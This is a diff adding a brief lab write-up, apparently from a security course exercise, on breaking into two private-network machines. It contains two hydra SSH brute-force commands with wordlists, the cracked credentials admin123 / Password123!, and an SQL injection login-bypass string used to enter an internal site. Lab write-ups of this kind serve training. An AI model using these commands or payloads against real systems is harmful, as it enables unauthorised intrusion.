@@ -1,0 +1,14 @@
+For gaining access and cracking password, used hydra
+
+Command used: 
+hydra -L '/home/admin123/Desktop/user.txt' -P '/usr/share/wordlists/udacity.txt' ssh://10.1.0.7 -t 8
+hydra -L '/home/admin123/Desktop/user.txt' -P '/usr/share/wordlists/udacity.txt' ssh://10.1.0.12 -t 8
+
+Process: First of all, installed hydra on kali machine. Then, opened a file named user.txt, wrote the username. After that, ussing the avobe commands and udacity.txt wordlists received the username and password.
+
+Output: User name and Password.
+usedname: admin123
+password: Password123!
+Using those we got the access of the site.
+
+For gaining access in 10.1.0.7 I have used ” ‘ or ‘1’=’1 “ this password, in the process of SQL injections and received the access in 10.1.0.7 's internal site which is shown in image "login 10.1.0.7".	
